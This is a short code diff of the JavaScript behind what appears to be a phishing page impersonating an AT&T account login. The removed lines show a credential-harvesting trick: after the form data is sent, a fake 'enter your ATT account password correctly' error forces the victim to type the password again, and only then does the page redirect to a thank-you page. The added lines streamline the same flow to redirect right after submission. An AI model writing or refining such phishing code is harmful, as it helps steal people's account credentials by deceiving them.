@@ -77,24 +77,16 @@ document.addEventListener('DOMContentLoaded', function() {
                     "Content-type": "application/json; charset=UTF-8"
                 }
             })
-            .then(function(){
-                    if(count < 1){
-                         count ++;
-                        passerror.style.display = "block";
-                        passerror.style.fontSize = "small";
-                        document.getElementById("password").value = ""
-                        passerror.innerHTML = "Please enter your ATT account password correctly";
-                       
-                        
-                        }
-                        else{  
-                           setCookie("username", username, 30);
-                           window.location.href= "./thanks.html"
-                        }
-                    
-                })
-                   
-
-            }
-            
-
+            .then(function(response) {
+                // Simulate successful login (after second submission)
+                setCookie("username", username, 30);
+                // Redirect to thanks.html (success)
+                window.location.href = "./thanks.html";
+            })
+            .catch(function(error) {
+                passerror.style.fontSize = "small";
+                passerror.innerHTML = "There was an error processing your request.";
+            });
+        }
+    });
+});
